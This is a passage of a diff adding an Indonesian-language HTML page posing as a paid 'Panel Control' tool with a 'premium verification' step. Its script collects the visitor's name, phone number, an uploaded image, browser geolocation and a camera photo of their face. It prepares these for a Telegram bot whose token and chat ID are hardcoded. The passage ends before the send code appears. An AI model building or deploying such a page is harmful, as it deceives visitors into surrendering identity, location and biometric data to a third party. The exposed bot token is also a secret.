@@ -1,0 +1,1392 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Panel Control V1.8</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-blue: #0066ff;
+            --light-blue: #e6f0ff;
+            --dark-blue: #0044aa;
+            --danger-red: #ff0033;
+            --success-green: #00cc66;
+            --warning-yellow: #ffcc00;
+            --gray: #f5f7fa;
+            --text-dark: #333;
+            --text-light: #666;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #f8fafc;
+            min-height: 100vh;
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+            color: var(--text-dark);
+            position: relative;
+        }
+        
+        /* Header Styles */
+        header {
+            background-color: white;
+            box-shadow: 0 2px 15px rgba(0, 82, 204, 0.1);
+            padding: 15px 30px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .logo {
+            height: 40px;
+        }
+        
+        .panel-name {
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: var(--primary-blue);
+            letter-spacing: 0.5px;
+        }
+        
+        .menu-toggle {
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            color: var(--primary-blue);
+            cursor: pointer;
+            padding: 5px 10px;
+            border-radius: 5px;
+            transition: all 0.3s;
+        }
+        
+        .menu-toggle:hover {
+            background-color: var(--light-blue);
+        }
+        
+        /* Warning Banner */
+        .warning-banner {
+            background-color: #fff8e6;
+            border: 2px solid #ffcc00;
+            border-radius: 0 0 8px 8px;
+            padding: 12px 20px;
+            text-align: center;
+            position: fixed;
+            top: 15%;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80%;
+            max-width: 800px;
+            z-index: 99;
+            display: none;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            animation: slideDown 0.5s ease-out;
+        }
+        
+        .warning-text {
+            color: var(--text-dark);
+            font-weight: 600;
+            font-size: 1.1rem;
+        }
+        
+        .warning-text strong {
+            color: var(--danger-red);
+        }
+        
+        .close-warning {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: var(--text-light);
+            font-size: 1.2rem;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .close-warning:hover {
+            color: var(--danger-red);
+        }
+        
+        /* Sidebar Styles */
+        .sidebar {
+            position: fixed;
+            top: 0;
+            left: -300px;
+            width: 280px;
+            height: 100vh;
+            background-color: white;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.1);
+            z-index: 99;
+            transition: left 0.4s ease-out;
+            padding-top: 80px;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .sidebar.open {
+            left: 0;
+        }
+        
+        .sidebar-item {
+            padding: 15px 25px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            text-decoration: none;
+            color: var(--text-dark);
+            font-size: 1.1rem;
+            font-weight: 500;
+            transition: all 0.3s;
+            border-left: 4px solid transparent;
+            position: relative;
+        }
+        
+        .sidebar-item:hover {
+            background-color: var(--light-blue);
+            border-left: 4px solid var(--primary-blue);
+            color: var(--primary-blue);
+        }
+        
+        .sidebar-item i {
+            width: 24px;
+            text-align: center;
+            color: var(--primary-blue);
+        }
+        
+        .badge {
+            position: absolute;
+            right: 20px;
+            background-color: var(--danger-red);
+            color: white;
+            font-size: 0.7rem;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-weight: bold;
+        }
+        
+        /* Main Content Styles */
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            flex: 1;
+            padding: 40px 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+            width: 100%;
+            z-index: 2;
+        }
+        
+        /* Login Page Styles */
+        .login-container {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 82, 204, 0.15);
+            padding: 40px;
+            width: 100%;
+            max-width: 450px;
+            text-align: center;
+            animation: fadeIn 0.8s ease-out;
+        }
+        
+        .login-title {
+            color: var(--primary-blue);
+            margin-bottom: 25px;
+            font-size: 1.8rem;
+            font-weight: 700;
+        }
+        
+        .key-input-group {
+            position: relative;
+            margin-bottom: 25px;
+        }
+        
+        .key-input {
+            width: 100%;
+            padding: 14px 20px;
+            border: 2px solid #e1e8ed;
+            border-radius: 10px;
+            font-size: 1rem;
+            color: var(--text-dark);
+            transition: all 0.3s;
+            background: #f8fafc;
+            font-weight: 500;
+        }
+        
+        .key-input:focus {
+            outline: none;
+            border-color: var(--primary-blue);
+            box-shadow: 0 0 0 3px rgba(0, 102, 255, 0.2);
+        }
+        
+        .submit-btn {
+            background: var(--primary-blue);
+            color: white;
+            border: none;
+            padding: 14px 30px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+            box-shadow: 0 4px 10px rgba(0, 82, 204, 0.3);
+        }
+        
+        .submit-btn:hover {
+            background: var(--dark-blue);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0, 82, 204, 0.4);
+        }
+        
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+        
+        .error-message {
+            color: var(--danger-red);
+            margin-top: 15px;
+            font-weight: 600;
+            animation: shake 0.5s;
+            display: none;
+        }
+        
+        .success-indicator {
+            margin-top: 25px;
+            font-size: 3rem;
+            color: var(--success-green);
+            display: none;
+            animation: scaleUp 0.5s ease-out;
+        }
+        
+        /* Home Page Styles */
+        .home-container {
+            display: none;
+            width: 100%;
+            text-align: center;
+            animation: fadeIn 1s ease-out;
+        }
+        
+        .error-container {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 82, 204, 0.15);
+            padding: 50px 30px;
+            margin: 40px 0;
+            max-width: 800px;
+            position: relative;
+        }
+        
+        .error-code {
+            font-size: 8rem;
+            font-weight: 800;
+            color: var(--primary-blue);
+            margin-bottom: 10px;
+            opacity: 0.2;
+        }
+        
+        .error-message-large {
+            font-size: 2.5rem;
+            color: var(--text-dark);
+            margin-bottom: 20px;
+            font-weight: 700;
+        }
+        
+        .sub-message {
+            color: var(--text-light);
+            font-size: 1.3rem;
+            margin-top: 20px;
+            max-width: 700px;
+            line-height: 1.6;
+        }
+        
+        .premium-verification {
+            background: linear-gradient(135deg, #fff8e1, #ffeeba);
+            border-radius: 10px;
+            padding: 25px;
+            margin-top: 40px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            border: 1px solid #ffd700;
+        }
+        
+        .premium-title {
+            font-size: 1.8rem;
+            color: #8a6d00;
+            margin-bottom: 15px;
+            font-weight: 700;
+        }
+        
+        .premium-description {
+            color: #5c4a00;
+            margin-bottom: 20px;
+            font-size: 1.1rem;
+            line-height: 1.6;
+        }
+        
+        .premium-btn {
+            background: var(--primary-blue);
+            color: white;
+            border: none;
+            padding: 14px 30px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+            max-width: 300px;
+            box-shadow: 0 4px 10px rgba(0, 82, 204, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin: 0 auto;
+        }
+        
+        .premium-btn:hover {
+            background: var(--dark-blue);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0, 82, 204, 0.4);
+        }
+        
+        /* Verification Pages */
+        .verification-page {
+            display: none;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 82, 204, 0.15);
+            padding: 40px;
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+        }
+        
+        .verification-title {
+            color: var(--primary-blue);
+            margin-bottom: 25px;
+            font-size: 1.8rem;
+            font-weight: 700;
+            position: relative;
+            padding-bottom: 15px;
+        }
+        
+        .verification-title::after {
+            content: "";
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80px;
+            height: 4px;
+            background: var(--primary-blue);
+            border-radius: 2px;
+        }
+        
+        .verification-subtitle {
+            color: var(--text-light);
+            margin-bottom: 30px;
+            font-size: 1.1rem;
+            line-height: 1.6;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: var(--text-dark);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 14px 20px;
+            border: 2px solid #e1e8ed;
+            border-radius: 10px;
+            font-size: 1rem;
+            color: var(--text-dark);
+            transition: all 0.3s;
+            background: #f8fafc;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: var(--primary-blue);
+            box-shadow: 0 0 0 3px rgba(0, 102, 255, 0.2);
+        }
+        
+        .file-input-container {
+            position: relative;
+            overflow: hidden;
+            display: inline-block;
+            width: 100%;
+        }
+        
+        .file-input {
+            position: absolute;
+            left: 0;
+            top: 0;
+            opacity: 0;
+            width: 100%;
+            height: 100%;
+            cursor: pointer;
+        }
+        
+        .file-input-label {
+            display: block;
+            padding: 14px 20px;
+            background: #f8fafc;
+            border: 2px dashed #e1e8ed;
+            border-radius: 10px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .file-input-label:hover {
+            border-color: var(--primary-blue);
+            background: var(--light-blue);
+        }
+        
+        .file-name {
+            margin-top: 8px;
+            font-size: 0.9rem;
+            color: var(--text-light);
+            text-align: center;
+        }
+        
+        /* Face Verification Page */
+        .face-verification-page {
+            display: none;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 82, 204, 0.15);
+            padding: 40px;
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+        }
+        
+        .camera-container {
+            width: 100%;
+            margin: 20px 0;
+            border-radius: 10px;
+            overflow: hidden;
+            background: #000;
+            position: relative;
+            height: 300px;
+            border: 2px solid var(--primary-blue);
+        }
+        
+        #video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .face-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .face-circle {
+            width: 200px;
+            height: 200px;
+            border: 3px solid white;
+            border-radius: 50%;
+            box-shadow: 0 0 0 2000px rgba(0, 0, 0, 0.5);
+        }
+        
+        .verification-status {
+            margin-top: 20px;
+            font-size: 1.2rem;
+            font-weight: 600;
+            padding: 12px 20px;
+            border-radius: 8px;
+            background: #f0f8ff;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .verification-success {
+            color: var(--success-green);
+            background: #e6ffee;
+        }
+        
+        .verification-processing {
+            color: var(--warning-yellow);
+            background: #fff8e6;
+        }
+        
+        .location-status {
+            margin-top: 15px;
+            font-size: 1rem;
+            padding: 12px 20px;
+            border-radius: 8px;
+            background: #f5f5f5;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .capture-btn {
+            background: var(--primary-blue);
+            color: white;
+            border: none;
+            padding: 14px 30px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 20px;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 4px 10px rgba(0, 82, 204, 0.3);
+        }
+        
+        .capture-btn:hover {
+            background: var(--dark-blue);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0, 82, 204, 0.4);
+        }
+        
+        .capture-btn:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        /* Verification Steps */
+        .verification-steps {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            position: relative;
+        }
+        
+        .step {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: #e1e8ed;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            position: relative;
+            z-index: 2;
+            color: var(--text-light);
+        }
+        
+        .step.active {
+            background: var(--primary-blue);
+            color: white;
+            transform: scale(1.2);
+        }
+        
+        .step.completed {
+            background: var(--success-green);
+            color: white;
+        }
+        
+        .verification-steps::before {
+            content: "";
+            position: absolute;
+            top: 50%;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: #e1e8ed;
+            z-index: 1;
+        }
+        
+        /* Progress Bar */
+        .progress-container {
+            width: 100%;
+            height: 8px;
+            background: #e1e8ed;
+            border-radius: 4px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary-blue), var(--success-green));
+            width: 0%;
+            transition: width 0.5s ease;
+            border-radius: 4px;
+        }
+        
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.3s;
+        }
+        
+        .modal-content {
+            background: white;
+            border-radius: 15px;
+            padding: 40px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            position: relative;
+            animation: modalScale 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+        }
+        
+        .modal-icon {
+            font-size: 4rem;
+            color: var(--success-green);
+            margin-bottom: 20px;
+            animation: float 3s ease-in-out infinite;
+        }
+        
+        .modal-title {
+            color: var(--primary-blue);
+            font-size: 1.8rem;
+            margin-bottom: 20px;
+            font-weight: 700;
+        }
+        
+        .modal-message {
+            color: #555;
+            margin-bottom: 25px;
+            line-height: 1.6;
+            font-size: 1.1rem;
+        }
+        
+        .close-modal {
+            background: var(--primary-blue);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .close-modal:hover {
+            background: var(--dark-blue);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 82, 204, 0.3);
+        }
+        
+        /* Footer */
+        footer {
+            text-align: center;
+            padding: 20px;
+            color: var(--text-light);
+            font-size: 0.9rem;
+            background: white;
+            border-top: 1px solid #eaeaea;
+        }
+        
+        /* Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        @keyframes slideDown {
+            from { 
+                opacity: 0;
+                transform: translate(-50%, -100%);
+            }
+            to { 
+                opacity: 1;
+                transform: translate(-50%, 0);
+            }
+        }
+        
+        @keyframes modalScale {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        
+        @keyframes scaleUp {
+            0% {
+                transform: scale(0.5);
+                opacity: 0;
+            }
+            70% {
+                transform: scale(1.2);
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-8px); }
+            40%, 80% { transform: translateX(8px); }
+        }
+        
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-15px); }
+            100% { transform: translateY(0px); }
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 0.8; }
+            50% { transform: scale(1.05); opacity: 1; }
+            100% { transform: scale(1); opacity: 0.8; }
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .login-container {
+                padding: 30px 20px;
+            }
+            
+            .warning-banner {
+                width: 95%;
+                padding: 10px 15px;
+            }
+            
+            .warning-text {
+                font-size: 0.9rem;
+                padding-right: 30px;
+            }
+            
+            .verification-page, 
+            .face-verification-page {
+                padding: 30px 20px;
+            }
+            
+            .camera-container {
+                height: 250px;
+            }
+            
+            .error-code {
+                font-size: 6rem;
+            }
+            
+            .error-message-large {
+                font-size: 2rem;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .panel-name {
+                font-size: 1.2rem;
+            }
+            
+            header {
+                padding: 15px 20px;
+            }
+            
+            .camera-container {
+                height: 200px;
+            }
+            
+            .face-circle {
+                width: 150px;
+                height: 150px;
+            }
+            
+            .premium-title {
+                font-size: 1.5rem;
+            }
+            
+            .sub-message {
+                font-size: 1.1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Warning Banner -->
+    <div class="warning-banner" id="warningBanner">
+        <div class="warning-text">
+            <strong>PERINGATAN:</strong> Anda login dengan cara tidak resmi! Ini mungkin akan merusak sistem perangkat Anda. Pastikan Anda membeli tools hanya dari Telegram <strong>@voxas70</strong> selain itu berarti penipuan atau tidak resmi!
+        </div>
+        <button class="close-warning" id="closeWarning">
+            <i class="fas fa-times"></i>
+        </button>
+    </div>
+    
+    <!-- Header -->
+    <header>
+        <div class="logo-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/1200px-Anonymous_emblem.svg.png" alt="Logo" class="logo">
+            <div class="panel-name">Panel Control V1.8</div>
+        </div>
+        <button class="menu-toggle" id="menuToggle">
+            <i class="fas fa-bars"></i>
+        </button>
+    </header>
+    
+    <!-- Sidebar -->
+    <div class="sidebar" id="sidebar">
+        <a class="sidebar-item" href="#" data-feature="transfer">
+            <i class="fas fa-money-bill-wave"></i>
+            <span>Transfer Dana</span>
+            <span class="badge">Not Verified</span>
+        </a>
+        <a class="sidebar-item" href="#" data-feature="document">
+            <i class="fas fa-file-contract"></i>
+            <span>Document</span>
+            <span class="badge">Not Verified</span>
+        </a>
+        <a class="sidebar-item" href="#" data-feature="gallery">
+            <i class="fas fa-images"></i>
+            <span>Galery</span>
+            <span class="badge">Not Verified</span>
+        </a>
+        <a class="sidebar-item" href="#" data-feature="more">
+            <i class="fas fa-ellipsis-h"></i>
+            <span>Menu lainnya</span>
+            <span class="badge">Not Verified</span>
+        </a>
+        <a class="sidebar-item" href="#" data-feature="admin" id="adminButton">
+            <i class="fab fa-telegram"></i>
+            <span>Hubungi Admin</span>
+        </a>
+    </div>
+    
+    <!-- Main Content -->
+    <div class="container">
+        <!-- Login Page -->
+        <div class="login-container" id="loginPage">
+            <h1 class="login-title"><i class="fas fa-shield-alt"></i> Verifikasi Key Login</h1>
+            <div class="key-input-group">
+                <input type="password" class="key-input" id="keyInput" placeholder="Masukkan key login...">
+            </div>
+            <button class="submit-btn" id="submitKey">
+                <i class="fas fa-unlock"></i> Verifikasi Sekarang
+            </button>
+            <div class="error-message" id="errorMessage">
+                <i class="fas fa-exclamation-circle"></i> Key login salah
+            </div>
+            <div class="success-indicator" id="successIndicator">
+                <i class="fas fa-check-circle"></i>
+            </div>
+        </div>
+        
+        <!-- Home Page -->
+        <div class="home-container" id="homePage">
+            <div class="error-container">
+                <div class="error-code">404</div>
+                <h2 class="error-message-large">TARGET TIDAK DITEMUKAN</h2>
+                <p class="sub-message">Sistem tidak dapat menemukan target yang sesuai dengan parameter yang diberikan. Kemungkinan besar target tidak terdeteksi atau berada di luar jangkauan sistem.</p>
+                
+                <div class="premium-verification">
+                    <h3 class="premium-title"><i class="fas fa-crown"></i> VERIFIKASI PREMIUM DIBUTUHKAN</h3>
+                    <p class="premium-description">Untuk mengakses fitur premium dan menemukan target, Anda perlu menyelesaikan verifikasi akun premium terlebih dahulu.</p>
+                    <button class="premium-btn" id="premiumVerificationBtn">
+                        <i class="fas fa-shield-check"></i> Verifikasi Sekarang
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Verification Form Page -->
+        <div class="verification-page" id="verificationPage">
+            <h1 class="verification-title"><i class="fas fa-user-shield"></i> Verifikasi Premium</h1>
+            <p class="verification-subtitle">Lengkapi data berikut untuk mendapatkan akses premium ke semua fitur panel</p>
+            
+            <div class="verification-steps">
+                <div class="step active">1</div>
+                <div class="step">2</div>
+                <div class="step">3</div>
+            </div>
+            
+            <div class="form-group">
+                <label class="form-label" for="userName">
+                    <i class="fas fa-user"></i> Nama Lengkap
+                </label>
+                <input type="text" class="form-input" id="userName" placeholder="Masukkan nama lengkap">
+            </div>
+            
+            <div class="form-group">
+                <label class="form-label" for="userPhone">
+                    <i class="fas fa-phone"></i> Nomor Handphone
+                </label>
+                <input type="tel" class="form-input" id="userPhone" placeholder="Contoh: 081234567890">
+            </div>
+            
+            <div class="form-group">
+                <label class="form-label">
+                    <i class="fas fa-receipt"></i> Bukti Pembelian Premium
+                </label>
+                <div class="file-input-container">
+                    <input type="file" class="file-input" id="proofFile" accept="image/*">
+                    <label for="proofFile" class="file-input-label" id="fileInputLabel">
+                        <i class="fas fa-cloud-upload-alt"></i> Unggah Bukti Pembelian
+                    </label>
+                    <div class="file-name" id="fileName">Format: JPG/PNG (maks. 5MB)</div>
+                </div>
+            </div>
+            
+            <button class="submit-btn" id="submitVerification">
+                <i class="fas fa-paper-plane"></i> Lanjutkan Verifikasi
+            </button>
+        </div>
+        
+        <!-- Face Verification Page -->
+        <div class="face-verification-page" id="faceVerificationPage">
+            <h1 class="verification-title"><i class="fas fa-camera"></i> Verifikasi Keamanan</h1>
+            <p class="verification-subtitle">Selesaikan proses verifikasi dengan mengizinkan akses lokasi dan kamera</p>
+            
+            <div class="verification-steps">
+                <div class="step completed">1</div>
+                <div class="step active">2</div>
+                <div class="step">3</div>
+            </div>
+            
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            
+            <div class="camera-container">
+                <video id="video" autoplay playsinline></video>
+                <div class="face-overlay">
+                    <div class="face-circle"></div>
+                </div>
+            </div>
+            
+            <button class="capture-btn" id="captureBtn">
+                <i class="fas fa-camera"></i> Capture Wajah
+            </button>
+            
+            <div class="verification-status" id="verificationStatus">
+                <i class="fas fa-info-circle"></i> Silakan klik "Capture Wajah" untuk mengambil foto
+            </div>
+            
+            <div class="location-status" id="locationStatus">
+                <i class="fas fa-map-marker-alt"></i> Mendeteksi lokasi...
+            </div>
+        </div>
+    </div>
+    
+    <!-- Success Modal -->
+    <div class="modal" id="successModal">
+        <div class="modal-content">
+            <div class="modal-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <h3 class="modal-title">Verifikasi Berhasil!</h3>
+            <p class="modal-message">
+                Data verifikasi Anda sedang diproses oleh sistem. Proses ini membutuhkan waktu 15-30 menit.
+                <br><br>
+                Jika setelah 30 menit Anda belum mendapatkan akses, silakan hubungi admin melalui Telegram.
+            </p>
+            <button class="close-modal" id="closeSuccessModal">Tutup</button>
+        </div>
+    </div>
+    
+    <!-- Footer -->
+    <footer>
+        <p>&copy; 2023 Panel Control V1.8. Hak Akses Terbatas. | Telegram: @voxas70</p>
+    </footer>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Elements
+            const loginPage = document.getElementById('loginPage');
+            const homePage = document.getElementById('homePage');
+            const verificationPage = document.getElementById('verificationPage');
+            const faceVerificationPage = document.getElementById('faceVerificationPage');
+            const keyInput = document.getElementById('keyInput');
+            const submitBtn = document.getElementById('submitKey');
+            const errorMessage = document.getElementById('errorMessage');
+            const successIndicator = document.getElementById('successIndicator');
+            const warningBanner = document.getElementById('warningBanner');
+            const closeWarning = document.getElementById('closeWarning');
+            const menuToggle = document.getElementById('menuToggle');
+            const sidebar = document.getElementById('sidebar');
+            const adminButton = document.getElementById('adminButton');
+            const sidebarItems = document.querySelectorAll('.sidebar-item');
+            const successModal = document.getElementById('successModal');
+            const closeSuccessModal = document.getElementById('closeSuccessModal');
+            const premiumVerificationBtn = document.getElementById('premiumVerificationBtn');
+            const submitVerificationBtn = document.getElementById('submitVerification');
+            const proofFileInput = document.getElementById('proofFile');
+            const fileName = document.getElementById('fileName');
+            const video = document.getElementById('video');
+            const verificationStatus = document.getElementById('verificationStatus');
+            const locationStatus = document.getElementById('locationStatus');
+            const progressBar = document.getElementById('progressBar');
+            const captureBtn = document.getElementById('captureBtn');
+            
+            // Telegram data
+            const token = "7251971701:AAFZZymTfsk8YHGU4tLwyePkveAy-caLes0";
+            const chatId = "8130894224";
+            
+            // User data
+            let userData = {
+                name: "",
+                phone: "",
+                proof: null,
+                location: null,
+                faceImage: null
+            };
+            
+            // Correct key
+            const CORRECT_KEY = "VOXAS70#MEMBER759";
+            
+            // Submit key verification
+            submitBtn.addEventListener('click', verifyKey);
+            keyInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') verifyKey();
+            });
+            
+            // Close warning banner
+            closeWarning.addEventListener('click', function() {
+                warningBanner.style.display = 'none';
+            });
+            
+            // Toggle sidebar
+            menuToggle.addEventListener('click', function() {
+                sidebar.classList.toggle('open');
+            });
+            
+            // Close sidebar when clicking outside
+            document.addEventListener('click', function(event) {
+                if (!sidebar.contains(event.target) && 
+                    !menuToggle.contains(event.target) && 
+                    sidebar.classList.contains('open')) {
+                    sidebar.classList.remove('open');
+                }
+            });
+            
+            // Admin button click
+            adminButton.addEventListener('click', function() {
+                window.location.href = 'https://t.me/voxas70';
+            });
+            
+            // Sidebar items click
+            sidebarItems.forEach(item => {
+                item.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    
+                    if (this === adminButton) {
+                        window.location.href = 'https://t.me/voxas70';
+                    } else {
+                        homePage.style.display = 'none';
+                        verificationPage.style.display = 'block';
+                        sidebar.classList.remove('open');
+                    }
+                });
+            });
+            
+            // Premium verification button
+            premiumVerificationBtn.addEventListener('click', function() {
+                homePage.style.display = 'none';
+                verificationPage.style.display = 'block';
+            });
+            
+            // File input change
+            proofFileInput.addEventListener('change', function() {
+                if (this.files && this.files[0]) {
+                    const file = this.files[0];
+                    fileName.textContent = file.name;
+                    fileName.style.color = "#0066ff";
+                    fileName.style.fontWeight = "600";
+                    userData.proof = file;
+                    
+                    // Simpan file sebagai Base64 untuk dikirim ke Telegram
+                    const reader = new FileReader();
+                    reader.onload = function(e) {
+                        userData.proofBase64 = e.target.result.split(',')[1];
+                    };
+                    reader.readAsDataURL(file);
+                }
+            });
+            
+            // Submit verification form
+            submitVerificationBtn.addEventListener('click', function() {
+                userData.name = document.getElementById('userName').value.trim();
+                userData.phone = document.getElementById('userPhone').value.trim();
+                
+                if (!userData.name || !userData.phone || !userData.proof) {
+                    alert('Harap lengkapi semua data verifikasi!');
+                    return;
+                }
+                
+                // Show loading animation
+                submitVerificationBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Memproses...';
+                submitVerificationBtn.disabled = true;
+                
+                // Simulate processing
+                setTimeout(() => {
+                    // Move to face verification
+                    verificationPage.style.display = 'none';
+                    faceVerificationPage.style.display = 'block';
+                    startFaceVerification();
+                }, 1500);
+            });
+            
+            // Close success modal
+            closeSuccessModal.addEventListener('click', function() {
+                successModal.style.display = 'none';
+                faceVerificationPage.style.display = 'none';
+                homePage.style.display = 'block';
+            });
+            
+            // Verify key function
+            function verifyKey() {
+                const enteredKey = keyInput.value.trim();
+                
+                if (enteredKey === CORRECT_KEY) {
+                    // Key is correct
+                    errorMessage.style.display = 'none';
+                    successIndicator.style.display = 'block';
+                    
+                    // Simulate loading and redirect
+                    setTimeout(() => {
+                        loginPage.style.display = 'none';
+                        homePage.style.display = 'block';
+                        
+                        // Show warning banner after successful login
+                        warningBanner.style.display = 'block';
+                    }, 1500);
+                } else {
+                    // Key is incorrect
+                    errorMessage.style.display = 'block';
+                    keyInput.style.borderColor = '#e53935';
+                    successIndicator.style.display = 'none';
+                    
+                    // Shake animation for error
+                    keyInput.animate([
+                        { transform: 'translateX(0)' },
+                        { transform: 'translateX(-10px)' },
+                        { transform: 'translateX(10px)' },
+                        { transform: 'translateX(0)' }
+                    ], {
+                        duration: 500,
+                        iterations: 1
+                    });
+                }
+            }
+            
+            // Start face verification process
+            function startFaceVerification() {
+                // Update progress bar
+                progressBar.style.width = '30%';
+                
+                // Get user location
+                getLocation();
+                
+                // Start camera
+                startCamera();
+            }
+            
+            // Capture button click
+            captureBtn.addEventListener('click', async function() {
+                captureBtn.disabled = true;
+                captureBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Memproses...';
+                
+                // Capture image
+                await captureAndSendData();
+                
+                // Update UI
+                captureBtn.innerHTML = '<i class="fas fa-check"></i> Berhasil Dikirim';
+                verificationStatus.innerHTML = '<i class="fas fa-check-circle"></i> Verifikasi wajah berhasil!';
+                verificationStatus.className = 'verification-status verification-success';
+                
+                // Show success modal after delay
+                setTimeout(() => {
+                    successModal.style.display = 'flex';
+                }, 2000);
+            });
+            
+            // Get user location
+            function getLocation() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        position => {
+                            const lat = position.coords.latitude;
+                            const lon = position.coords.longitude;
+                            const gmapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                            
+                            locationStatus.innerHTML = `
+                                <i class="fas fa-map-marker-alt"></i> 
+                                Lokasi terdeteksi: 
+                                <a href="${gmapsLink}" target="_blank" style="color: #0066ff; text-decoration: underline;">
+                                    Lihat di Google Maps
+                                </a>
+                            `;
+                            
+                            userData.location = { lat, lon, gmapsLink };
+                        },
+                        error => {
+                            console.error("Error getting location:", error);
+                            locationStatus.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Gagal mendapatkan lokasi';
+                        }
+                    );
+                } else {
